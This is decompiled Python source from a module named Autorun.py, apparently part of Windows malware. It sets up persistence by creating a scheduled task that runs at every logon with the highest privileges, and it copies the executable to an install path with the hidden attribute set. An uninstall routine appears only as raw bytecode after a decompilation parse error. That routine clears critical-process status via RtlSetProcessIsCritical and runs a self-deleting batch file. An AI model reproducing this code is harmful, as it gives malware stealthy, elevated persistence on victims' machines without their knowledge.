# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: Core\Main\Autorun.py
import os, shutil, ctypes, subprocess

def AddToAutorun(AutorunName, InstallPath, ProcessName):
    subprocess.call(('schtasks /create /f /sc onlogon /rl highest /tn "' + AutorunName + '" /tr "' + InstallPath + ProcessName + '"'), shell=True)


def CopyToAutorun(CurrentPath, InstallPath, ProcessName):
    shutil.copy2(CurrentPath, '' + InstallPath + ProcessName)
    ctypes.windll.kernel32.SetFileAttributesW(InstallPath + ProcessName, 2)


schtasks = '@chcp 65001 && @schtasks.exe'

def SchtasksExists(AutorunName):
    try:
        Process = subprocess.check_output(f'{schtasks} /query /tn "{AutorunName}"', shell=True,
          stderr=(subprocess.DEVNULL),
          stdin=(subprocess.DEVNULL)).decode(encoding='utf-8', errors='strict')
    except subprocess.CalledProcessError:
        return False
    else:
        return 'ERROR:' not in Process


def InstallPathExists(InstallPath, ProcessName):
    if os.path.exists(InstallPath + ProcessName):
        return True


def Uninstall--- This code section failed: ---

 L.  45         0  LOAD_GLOBAL              ctypes
                2  LOAD_ATTR                windll
                4  LOAD_ATTR                ntdll
                6  LOAD_METHOD              RtlSetProcessIsCritical
                8  LOAD_CONST               0
               10  LOAD_CONST               0
               12  LOAD_CONST               0
               14  CALL_METHOD_3         3  ''
               16  LOAD_CONST               0
               18  COMPARE_OP               ==
               20  POP_TOP          

 L.  46        22  LOAD_GLOBAL              ctypes
               24  LOAD_ATTR                windll
               26  LOAD_ATTR                kernel32
               28  LOAD_METHOD              SetFileAttributesW
               30  LOAD_FAST                'CurrentPath'
               32  LOAD_CONST               0
               34  CALL_METHOD_2         2  ''
               36  POP_TOP          

 L.  47        38  LOAD_GLOBAL              ctypes
               40  LOAD_ATTR                windll
               42  LOAD_ATTR                kernel32
               44  LOAD_METHOD              SetFileAttributesW
               46  LOAD_FAST                'InstallPath'
               48  LOAD_FAST                'ProcessName'
               50  BINARY_ADD       
               52  LOAD_CONST               0
               54  CALL_METHOD_2         2  ''
               56  POP_TOP          

 L.  49        58  LOAD_GLOBAL              open
               60  LOAD_GLOBAL              os
               62  LOAD_ATTR                path
               64  LOAD_METHOD              join
               66  LOAD_FAST                'Directory'
               68  LOAD_STR                 'Uninstaller.bat'
               70  CALL_METHOD_2         2  ''
               72  LOAD_STR                 'w'
               74  CALL_FUNCTION_2       2  ''
               76  SETUP_WITH          148  'to 148'
               78  STORE_FAST               'OPATH'

 L.  50        80  LOAD_FAST                'OPATH'
               82  LOAD_METHOD              writelines
               84  LOAD_STR                 'taskkill /f /im "'
               86  LOAD_FAST                'CurrentName'
               88  BINARY_ADD       
               90  LOAD_STR                 '"\n'
               92  BINARY_ADD       

 L.  51        94  LOAD_STR                 'schtasks /delete /f /tn "'
               96  LOAD_FAST                'AutorunName'
               98  BINARY_ADD       
              100  LOAD_STR                 '"\n'
              102  BINARY_ADD       

 L.  52       104  LOAD_STR                 'del /s /q /f "'
              106  LOAD_FAST                'CurrentPath'
              108  BINARY_ADD       
              110  LOAD_STR                 '"\n'
              112  BINARY_ADD       

 L.  53       114  LOAD_STR                 'del /s /q /f "'
              116  LOAD_FAST                'InstallPath'
              118  BINARY_ADD       
              120  LOAD_FAST                'ProcessName'
              122  BINARY_ADD       
              124  LOAD_STR                 '"\n'
              126  BINARY_ADD       

 L.  54       128  LOAD_STR                 'rmdir /s /q "'
              130  LOAD_FAST                'Directory'
              132  BINARY_ADD       
              134  LOAD_STR                 '"'
              136  BINARY_ADD       

 L.  50       138  BUILD_LIST_5          5 
              140  CALL_METHOD_1         1  ''
              142  POP_TOP          
              144  POP_BLOCK        
              146  BEGIN_FINALLY    
            148_0  COME_FROM_WITH       76  '76'
              148  WITH_CLEANUP_START
              150  WITH_CLEANUP_FINISH
              152  END_FINALLY      
            154_0  COME_FROM           190  '190'
            154_1  COME_FROM           184  '184'

 L.  57       154  SETUP_FINALLY       176  'to 176'

 L.  58       156  LOAD_GLOBAL              os
              158  LOAD_METHOD              startfile
              160  LOAD_FAST                'Directory'
              162  LOAD_STR                 'Uninstaller.bat'
              164  BINARY_ADD       
              166  LOAD_STR                 'runas'
              168  CALL_METHOD_2         2  ''
              170  POP_TOP          
              172  POP_BLOCK        
              174  JUMP_FORWARD        192  'to 192'
            176_0  COME_FROM_FINALLY   154  '154'

 L.  59       176  POP_TOP          
              178  POP_TOP          
              180  POP_TOP          

 L.  60       182  POP_EXCEPT       
              184  JUMP_BACK           154  'to 154'
              186  END_FINALLY      

 L.  62       188  JUMP_FORWARD        192  'to 192'
              190  JUMP_BACK           154  'to 154'
            192_0  COME_FROM           188  '188'
            192_1  COME_FROM           174  '174'

Parse error at or near `JUMP_BACK' instruction at offset 184